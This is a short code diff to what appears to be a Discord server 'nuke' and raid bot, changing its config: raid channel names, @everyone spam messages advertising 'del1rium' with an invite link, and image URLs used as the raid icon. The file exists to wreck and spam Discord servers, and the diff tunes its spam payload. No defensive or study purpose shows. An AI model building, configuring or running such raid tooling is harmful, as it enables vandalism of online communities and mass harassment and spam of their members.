@@ -117,10 +117,10 @@ LOG_CHANNEL_ID = 1458257075393003561
 
 # --- NUKE COMMAND TEXTS & CONFIG ---
 NORMAL_NUKE_CHANNEL_NAME = "raid-by-del1rium"
-NORMAL_NUKE_TEXT = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
+NORMAL_NUKE_TEXT = "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)"
 PREMIUM_CHANNEL_NAME = "premium-raid"
-PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2"
-RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"
+PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2 https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
+RAID_ICON_URL = "https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
 
 # Bot setup
 intents = discord.Intents.all()
